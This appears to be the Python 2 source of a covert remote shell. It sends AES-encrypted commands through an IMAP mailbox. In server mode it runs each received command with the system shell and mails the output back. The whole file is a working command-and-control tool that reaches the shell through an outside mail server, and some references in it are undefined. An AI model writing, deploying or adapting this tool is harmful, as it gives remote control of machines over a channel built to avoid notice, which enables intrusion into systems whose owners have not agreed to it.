import sys
import StringIO
import subprocess

from config import imap_shell_config
from aes import imap_shell_aes
from sig import imap_shell_signal
from imap import imap_session

def client_shell(session):
    session.search_ISSP(client_msg_callback)
    print "> ",
    cmd = sys.stdin.readline()
    while cmd != "":
        cmd = cmd.rstrip()
        if cmd == 'quit':
            break
        elif cmd == '':
            pass
        else:
            session.append_ISCP(cmd)
            session.wait_ISSP(client_msg_callback)

        print "\r> ",
        cmd = sys.stdin.readline()

def client_msg_callback(uid, message):
    message = imap_shell_aes(config('imap_passwd')).decrypt(message)
    print('\r%s' % message)


def server_batch(session):
    if session.search_ISCP(server_msg_callback):
        session.wait_ISCP(server_msg_callback)

def server_msg_callback(uid, message):
    message = imap_shell_aes(config('imap_passwd')).decrypt(message)

    fp = StringIO.StringIO(message)
    ret = ''
    for cmd in fp:
        ret += server_process_cmd(cmd)

    session.append_ISSP(ret)

def server_process_cmd(cmd):
    ret = "C: %s\n" % cmd
    ret += "S: "
    try:
        ret += subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError as e:
        ret += str(e)
    except:
        ret += "Unexpected error.\n"
    return ret


if __name__ == '__main__':
    config = imap_shell_config('config.ini')

    with imap_session({
            'addr'    : config('imap_address'),
            'port'    : config('imap_port'),
            'user'    : config('imap_user'),
            'passwd'  : config('imap_passwd'),
            'mailbox' : config('imap_shell_mailbox'),
            'account' : config('email_account')}) as session:
        if '-s' in sys.argv:
            server_batch(session)
        else:
            client_shell(session)
